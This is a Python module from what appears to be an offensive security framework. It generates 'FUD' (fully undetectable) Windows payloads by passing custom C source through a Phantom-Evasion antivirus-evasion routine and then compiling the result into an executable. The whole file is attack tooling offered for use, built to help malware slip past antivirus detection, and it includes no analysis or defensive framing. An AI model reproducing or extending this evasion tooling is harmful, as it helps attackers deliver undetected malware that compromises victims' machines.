
from core import controller, utils
from libs import actions
import importlib


class Payload(controller.Module):
	__info__ = {
		'name': 'Custom payload generator',
		'description': [
			'Generate FUD payload from custom source',
			'Payload must be .c file'
		],
		'authors': [
			'Module: dmknght, dmknghtx2team@gmail.com',
			'Technology: Diego Cornacchini, oddcod3@gmail.com'
		],
		'references': [
			'https://github.com/dmknght/blurEvasion',
			'https://github.com/oddcod3/Phantom-Evasion'
		]
	}
	platform = controller.Options('windows', 'Target\'s platform')
	architecture = controller.Options('x86', 'Target\'s architecture')
	source = controller.Options('', 'Payload source path')
	destination = controller.Options('output/', 'Output payload after generate')
	evasion_tech = controller.Options('PhantomEvasion', 'FUD technology')
	evasion_method = controller.Options('MHA', 'Evasion method. Usage "show evasions"')

	def run(self):
		try:
			data = actions.getout(self.source)
			tmp_name = 'evil'
			# Start making new payload
			evade_method = "{}_mathinject_{}".format(self.evasion_method, self.platform)
			evade_tech = importlib.import_module("evasion.{}".format(self.evasion_tech))
			evade_run = getattr(evade_tech, evade_method)(data, tmp_name)
			data = evade_run.run()
		# Get new data, start writing to output file
			if self.destination[-1] != '/':
				self.destination += '/'
			output_payload = self.destination + 'output.c'

			actions.writeout(data, output_payload)
			# Write done!, start building exe file
			actions.build_exec(self.platform, self.architecture, output_payload, self.destination)
		except:
			utils.printf("Error while running module", 'bad')
